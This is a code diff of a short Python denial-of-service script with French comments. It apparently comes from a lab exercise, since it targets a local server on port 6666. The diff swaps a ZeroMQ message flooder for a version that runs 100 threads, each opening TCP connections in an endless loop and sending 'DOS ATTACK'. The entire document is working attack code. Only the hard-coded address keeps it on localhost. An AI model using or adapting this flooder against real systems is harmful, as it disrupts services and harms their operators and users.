@@ -1,18 +1,35 @@
-import zmq  # Bibliothèque pour la communication réseau
-import time  # Pour ajouter des délais
+import socket
+import threading
+import time
 
-# Création du contexte et du socket ZeroMQ pour envoyer des requêtes
-context = zmq.Context()
-socket = context.socket(zmq.REQ)  # Socket de type REQ (request)
-socket.connect("tcp://localhost:6666")  # Connexion au serveur
+# Configuration de l'attaque DoS
+target_ip = "127.0.0.1"  # Adresse IP de la cible
+port = 6666  # Port de la cible
+num_threads = 100  # Nombre de threads à exécuter en parallèle
 
-print("Launching DoS attack...")
+# Fonction qui envoie un grand nombre de requêtes au serveur
+def dos_attack():
+    while True:
+        try:
+            # Création d'une connexion socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target_ip, port))
+            
+            # Envoi d'une requête vide
+            sock.send(b"DOS ATTACK\n")
+            sock.close()
+        except Exception as e:
+            print(f"Erreur: {e}")
+        
+        time.sleep(0.1)  # Petite pause pour ne pas crasher l'attaquant
 
-# Boucle infinie pour envoyer des messages massifs au serveur
-while True:
-    socket.send(b"SPAM" * 1000)  # Envoi d'un message énorme pour saturer le serveur
-    try:
-        socket.recv(zmq.NOBLOCK)  # Tentative de lecture de la réponse sans bloquer
-    except zmq.Again:
-        pass  # Ignorer l'erreur si aucune réponse n'est reçue
-    time.sleep(0.01)  # Pause courte pour éviter un crash
+# Lancement de plusieurs threads pour amplifier l'attaque
+threads = []
+for _ in range(num_threads):
+    thread = threading.Thread(target=dos_attack)
+    thread.start()
+    threads.append(thread)
+
+# Attendre que tous les threads terminent
+for thread in threads:
+    thread.join()
